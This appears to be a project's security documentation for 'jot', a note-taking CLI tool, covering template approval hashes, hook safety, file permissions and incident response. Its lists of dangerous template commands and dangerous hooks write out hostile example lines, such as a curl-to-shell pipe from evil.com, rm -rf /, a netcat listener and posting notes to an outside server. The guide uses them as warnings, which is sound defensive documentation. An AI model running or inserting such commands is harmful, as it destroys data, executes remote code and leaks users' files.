# Security Model

jot's approach to security, particularly around template execution and workspace protection.

## Security Philosophy

### Principle of Least Privilege

jot operates with minimal required permissions:

- **No elevated privileges** - Runs with normal user permissions
- **Local-only operation** - No network access required for core functionality
- **Explicit consent** - User approval required for potentially dangerous operations
- **Transparent operations** - Security decisions are visible and auditable

### Defense in Depth

Multiple layers of security for template execution:

1. **Explicit approval** - Templates must be approved before executing shell commands
2. **Content verification** - Template changes invalidate previous approvals
3. **Hash-based tracking** - Tamper detection through content hashing
4. **User visibility** - Clear indication of what requires approval

## Template Security

Templates can execute shell commands for dynamic content generation, which requires careful security controls.

### Approval System

**Initial Approval Required:**
```bash
# Template requires approval before first use
jot capture meeting
# Error: Template 'meeting' requires approval

# Explicit approval
jot template approve meeting
# Template approved for execution

# Now can use template
jot capture meeting
# Template executes successfully
```

**Content-Based Validation:**
```bash
# Template content is hashed when approved
jot template approve meeting
# SHA256 hash stored: a1b2c3d4e5f6...

# Editing template invalidates approval
jot template edit meeting
# (Make changes and save)

jot capture meeting
# Error: Template content changed, re-approval required

# Re-approve after review
jot template approve meeting
```

### Security Implementation

**Approval Storage:**
```
.jot/template_permissions
```

**Format:**
```
template-name:sha256:hash-of-content
meeting:sha256:a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890
daily:sha256:f6e5d4c3b2a1098765432109876543210987654321098765432109876543210
```

**Hash Calculation:**
- Content includes template file content and any shell commands
- Uses SHA-256 for cryptographic integrity
- Includes frontmatter and all executable commands

### Template Command Restrictions

**Allowed Command Patterns:**
```bash
# Safe read-only commands
$(date)                          # Current date/time
$(pwd)                          # Current directory
$(whoami)                       # Current user
$(git branch --show-current)    # Git information
$(basename $(pwd))              # Directory name
```

**Potentially Dangerous Commands:**
```bash
# File system modifications
$(rm -rf /)                     # Destructive operations
$(chmod 777 ~/.ssh)             # Permission changes
$(curl http://evil.com/script | sh)  # Remote code execution

# Network operations
$(wget malicious.com/payload)   # Downloading executables
$(nc -l 1234)                   # Network listeners

# System modifications
$(sudo systemctl stop ssh)     # System service changes
$(crontab -e)                  # Scheduled task modifications
```

### Review Guidelines

**Before Approving Templates:**

1. **Read all shell commands** - Understand what each `$(...)` does
2. **Verify command safety** - Ensure commands are read-only or safe
3. **Check for user input** - Ensure no unvalidated input reaches shell
4. **Consider command failure** - Ensure failures don't cause problems
5. **Review periodically** - Re-examine approved templates occasionally

**Safe Command Examples:**
```markdown
# Good: Read-only system information
$(date '+%Y-%m-%d')
$(git log -1 --pretty=format:'%h')
$(uname -s)

# Good: Safe with fallbacks
$(git branch --show-current 2>/dev/null || echo "no-branch")
$(curl -s wttr.in?format=3 2>/dev/null || echo "Weather unavailable")

# Risky: Network access (review carefully)
$(curl -s api.example.com/data)

# Dangerous: File system modification
$(rm old-file.txt)
$(mkdir -p /tmp/dangerous)
```

## Workspace Security

### File Permissions

**Recommended Permissions:**
```bash
# Workspace readable by user and group
chmod 755 workspace-directory/
chmod 755 .jot/

# Notes readable by user and group
chmod 644 inbox.md
chmod 644 lib/*.md

# Configuration private to user
chmod 600 ~/.jotrc
chmod 644 .jot/config.json

# Template permissions readable
chmod 644 .jot/template_permissions

# Hooks executable by user only
chmod 700 .jot/hooks/
chmod 755 .jot/hooks/*.sh
```

**Permission Verification:**
```bash
# Check workspace permissions
jot doctor

# Manual verification
ls -la .jot/
ls -la lib/
```

### Configuration Security

**Sensitive Information in Config:**

Configuration files may contain:
- Workspace paths that reveal directory structure
- Editor preferences that could affect security
- Hook configurations that enable automation

**Best Practices:**
```bash
# Protect global config
chmod 600 ~/.jotrc

# Use relative paths when possible
{
  "workspaces": {
    "work": "./work-notes",    # Relative path
    "personal": "~/notes"      # Home directory relative
  }
}

# Avoid absolute paths to sensitive directories
{
  "workspaces": {
    "bad": "/etc/sensitive-data"  # Don't do this
  }
}
```

## Hook Security

Hooks are shell scripts that run automatically after certain operations.

### Hook Execution Model

**Hook Types:**
- `post-capture.sh` - Runs after note capture
- `post-refile.sh` - Runs after refiling operations
- `pre-archive.sh` - Runs before archiving

**Execution Context:**
- Hooks run with user permissions
- Working directory is workspace root
- Environment variables are inherited
- Hooks receive operation context as arguments

### Hook Security Guidelines

**Safe Hook Examples:**
```bash
#!/bin/bash
# post-capture.sh - Log capture activity
echo "$(date): Captured note" >> .jot/logs/activity.log

# post-refile.sh - Git commit changes
if git rev-parse --git-dir > /dev/null 2>&1; then
    git add -A
    git commit -m "jot: refile $(date)" || true
fi
```

**Dangerous Hook Examples:**
```bash
#!/bin/bash
# DON'T DO THESE:

# Network operations without user consent
curl -X POST api.company.com/notes -d @inbox.md

# File system operations outside workspace
rm -rf /tmp/*
chmod 777 ~/.ssh/

# Remote execution
ssh remote-server "dangerous-command"
```

**Hook Review Checklist:**
1. **Understand all commands** - Know what each line does
2. **Check file operations** - Ensure operations stay within workspace
3. **Verify network operations** - Review any external communication
4. **Consider failure cases** - Ensure failures don't cause problems
5. **Test in isolation** - Run hooks manually before enabling

### Hook Management

**Enable/Disable Hooks:**
```bash
# List available hooks
jot hooks list

# Enable specific hook
jot hooks enable post-capture

# Disable hook
jot hooks disable post-capture

# Check hook status
ls -la .jot/hooks/
```

**Hook Permissions:**
```bash
# Hooks must be executable
chmod +x .jot/hooks/post-capture.sh

# But should not be world-writable
chmod 755 .jot/hooks/post-capture.sh  # Not 777
```

## Multi-User Workspaces

When multiple users share a workspace:

### Shared Workspace Setup

**File Ownership:**
```bash
# Create shared group
sudo groupadd jot-users
sudo usermod -a -G jot-users alice
sudo usermod -a -G jot-users bob

# Set workspace permissions
chgrp -R jot-users workspace/
chmod -R g+w workspace/
chmod g+s workspace/lib/  # New files inherit group
```

**Template Security in Shared Workspaces:**

```bash
# Each user maintains their own approvals
alice: .jot/template_permissions.alice
bob: .jot/template_permissions.bob

# Or require all users to approve
alice: jot template approve meeting
bob: jot template approve meeting
```

### Access Control

**File-Level Access:**
- All users can read all notes
- All users can capture new notes
- Refiling operations require write access to target files
- Templates require individual approval per user

**Operation-Level Access:**
- Captures: All users
- Refiling: Users with write access
- Template approval: Individual users only
- Hook management: Workspace owner only

## Audit and Monitoring

### Security Logging

**Operation Logs:**
```
.jot/logs/security.log
```

**Logged Events:**
- Template approvals and revocations
- Hook executions and failures
- Configuration changes
- Permission errors

**Log Format:**
```
2025-01-15T14:30:00Z [SECURITY] Template 'meeting' approved by user 'alice'
2025-01-15T14:31:00Z [SECURITY] Hook 'post-capture' executed successfully
2025-01-15T14:32:00Z [ERROR] Permission denied accessing '/etc/sensitive'
```

### Security Monitoring

**Regular Security Checks:**
```bash
# Run security diagnostics
jot doctor --security

# Check for unusual permissions
find .jot/ -type f -perm /o+w

# Review approved templates
jot template list

# Check hook configurations
jot hooks list
```

**Automated Monitoring:**
```bash
#!/bin/bash
# security-check.sh
# Run weekly security audit

# Check for world-writable files
find . -type f -perm /o+w > /tmp/jot-security-check

# Check for modified templates without approval
jot template list | grep "needs approval" > /tmp/jot-unapproved

# Email results if issues found
if [ -s /tmp/jot-security-check ] || [ -s /tmp/jot-unapproved ]; then
    mail -s "jot Security Alert" admin@company.com < /tmp/jot-security-check
fi
```

## Incident Response

### Compromised Templates

If a template is suspected of being malicious:

1. **Immediately revoke approval:**
   ```bash
   jot template revoke suspicious-template
   ```

2. **Review template content:**
   ```bash
   jot template view suspicious-template
   ```

3. **Check execution logs:**
   ```bash
   grep suspicious-template .jot/logs/*.log
   ```

4. **Audit system for changes:**
   ```bash
   # Check for unexpected files
   find . -newer .jot/template_permissions
   
   # Check for permission changes
   ls -la .jot/ lib/
   ```

### Unauthorized Access

If workspace access is compromised:

1. **Change file permissions:**
   ```bash
   chmod 700 .jot/
   chmod 600 .jot/config.json .jot/template_permissions
   ```

2. **Review logs for suspicious activity:**
   ```bash
   tail -100 .jot/logs/*.log
   ```

3. **Re-approve all templates:**
   ```bash
   rm .jot/template_permissions
   jot template list  # Shows all need approval
   # Review and re-approve each template
   ```

4. **Audit note content for unauthorized changes:**
   ```bash
   git log --oneline  # If using git
   git diff HEAD~10   # Check recent changes
   ```

## Security Best Practices Summary

### For Individual Users

1. **Review templates before approval** - Understand what shell commands do
2. **Use version control** - Git helps track unauthorized changes
3. **Regular backups** - Protect against data loss
4. **Monitor permissions** - Run `jot doctor` regularly
5. **Keep hooks simple** - Minimize automation complexity

### For Teams

1. **Shared template review** - Multiple people approve shared templates
2. **Access control** - Use file permissions to control write access
3. **Audit logging** - Monitor template approvals and hook executions
4. **Security training** - Ensure team understands template security
5. **Incident response plan** - Know how to respond to security issues

### For System Administrators

1. **User education** - Train users on template security
2. **Monitoring** - Implement automated security checks
3. **Backup strategy** - Ensure workspace data is backed up
4. **Access reviews** - Periodically review workspace access
5. **Update procedures** - Keep jot updated for security fixes

## See Also

- **[Templates Guide](../user-guide/templates.md)** - Template creation and usage
- **[Configuration](../user-guide/configuration.md)** - Secure configuration practices
- **[File Structure](file-structure.md)** - Understanding workspace organization
- **[Troubleshooting](../user-guide/troubleshooting.md)** - Security issue resolution
